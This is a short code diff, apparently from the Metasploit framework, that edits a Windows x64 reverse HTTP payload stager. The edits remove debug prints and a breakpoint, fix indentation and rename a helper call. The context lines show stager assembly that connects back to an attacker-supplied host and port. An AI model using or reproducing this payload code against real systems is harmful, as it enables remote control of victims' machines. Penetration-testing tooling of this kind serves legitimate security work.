@@ -46,12 +46,11 @@ module Payload::Windows::ReverseHttp_x64
   # Generate the first stage
   #
   def generate(opts={})
-    STDERR.puts("#{opts.inspect}\n")
     ssl = opts[:ssl] || false
 
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
-      return generate_reverse_https({
+      return generate_reverse_http({
         :ssl         => ssl,
         :host        => datastore['LHOST'],
         :port        => datastore['LPORT'],
@@ -244,7 +243,6 @@ module Payload::Windows::ReverseHttp_x64
         jmp get_server_uri
 
       httpopenrequest:
-        ;int 0x03
         mov rcx, rax                  ; HINTERNET (hConnect)
         xor rdx, rdx                  ; NULL pointer (lpszVerb)
         pop r8                        ; String (lpszObjectName)
@@ -314,14 +312,14 @@ module Payload::Windows::ReverseHttp_x64
 
     if opts[:exitfunk]
       asm << %Q^
-        failure:
-          call exitfunk
+      failure:
+        call exitfunk
       ^
     else
       asm << %Q^
-        failure:
-          push 0x56A2B5F0           ; hardcoded to exitprocess for size
-          call rbp
+      failure:
+        push 0x56A2B5F0           ; hardcoded to exitprocess for size
+        call rbp
       ^
     end
 
@@ -373,7 +371,7 @@ module Payload::Windows::ReverseHttp_x64
     if opts[:exitfunk]
       asm << asm_exitfunk(opts)
     end
-    STDERR.puts("#{asm}\n")
+
     asm
   end
 
